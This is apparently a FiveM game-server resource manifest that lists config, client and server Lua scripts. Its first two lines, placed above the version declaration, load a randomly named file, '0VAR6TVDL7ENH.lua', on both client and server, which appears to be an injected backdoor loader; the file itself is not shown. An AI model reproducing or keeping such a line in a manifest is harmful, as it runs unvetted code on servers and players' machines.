server_script "0VAR6TVDL7ENH.lua"
client_script "0VAR6TVDL7ENH.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")

client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"config/client.lua",
	"config/shared.lua",
	"client/**/*.lua",
})

server_scripts({
	"config/server.lua",
	"config/shared.lua",
	"server/**/*.lua",
})
